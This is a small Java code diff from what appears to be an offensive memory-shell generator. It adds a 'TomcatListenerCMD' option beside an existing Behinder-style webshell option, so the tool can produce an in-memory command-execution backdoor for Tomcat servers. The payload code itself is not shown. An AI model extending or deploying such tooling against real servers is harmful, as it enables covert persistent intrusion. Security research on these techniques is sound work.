@@ -8,6 +8,7 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.NotFoundException;
 import org.memshell.TomcatListenerBehinderByLei;
+import org.memshell.TomcatListenerCMD;
 
 import java.io.IOException;
 import java.lang.reflect.Field;
@@ -47,6 +48,9 @@ public class TemplateUtils {
             // TomcatListenerBehinderByLei,雷桑的马子配雷桑的改版冰蝎
             case "TomcatListenerBehinderByLei":
                 return TomcatListenerBehinderByLei.generateListenerMemShell();
+            // TomcatListenerCMD
+            case "TomcatListenerCMD":
+                return TomcatListenerCMD.generateListenerMemShell();
             default:
                 //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
                 UUID uuid = UUID.randomUUID();
